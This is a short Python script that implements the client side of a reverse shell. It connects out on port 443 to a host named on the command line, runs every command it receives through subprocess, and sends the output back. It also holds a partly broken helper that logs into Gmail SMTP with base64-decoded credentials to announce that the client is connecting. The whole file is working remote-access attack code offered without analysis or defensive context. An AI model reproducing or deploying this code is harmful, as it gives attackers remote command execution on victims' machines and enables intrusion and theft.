import socket
import os
import subprocess
import sys
import base64
import smtplib
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_mail():
	s=smtplib.SMTP('smtp.gmail.com',587, None, 30)
	user_email = base64.b64decode()
	Password = base64.b64decode()
	s.login(user_email, Password)

	msg = MIMEMultipart()
	name = " "
	email = user_email

	msg['From'] = email
	msg['To'] = email
	msg['Subject'] = "Client is connecting"

	text = "Setup the server, the client is currently waiting for a response"
	T1 = MIMEText(text, "plain")

	msg.attach(T1)

	s.send_message(msg)
	del msg

HOST = sys.argv[1]
PORT = 443
Buffer_Size = 1024 * 128
Separator = "<sep>"

s = socket.socket()
s.connect((HOST,PORT))
cwd = os.getcwd()
s.send(cwd.encode())

while True:
	command = s.recv(Buffer_Size).decode()
	split_command = command.split()

	if command.lower() == "exit":
		break
	if split_command[0].lower() == "cd":
		try:
			os.chdir(' '.join(split_command[1:]))
		except FileNotFoundError as e:
			output = str(e)
		else:
			output = ""
	else:
		output = subprocess.getoutput(command)

	cwd = os.getcwd()
	message = f'{output}{Separator}{cwd}'
	s.send(message.encode())
s.close()